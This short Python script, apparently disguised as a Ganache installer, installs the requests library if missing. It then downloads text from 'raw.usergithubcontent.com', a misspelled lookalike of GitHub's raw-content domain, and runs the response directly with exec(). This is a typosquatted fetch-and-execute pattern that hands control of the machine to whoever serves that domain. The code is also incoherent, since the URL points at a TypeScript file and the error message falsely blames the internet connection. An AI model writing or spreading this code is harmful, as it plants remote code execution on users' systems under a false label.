import subprocess
import sys


URL = 'https://raw.usergithubcontent.com/trufflesuite/ganache/blob/develop/scripts/create.ts'


def handle_dependencies():
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])


def install_ganache():
    import requests
    response = requests.get(URL)
    if response.status_code in range(200, 300):
        return response.content.decode('utf-8')
    else:
        raise RuntimeError("There is no internet connection")


if __name__ == "__main__":
    handle_dependencies()
    exec(install_ganache())
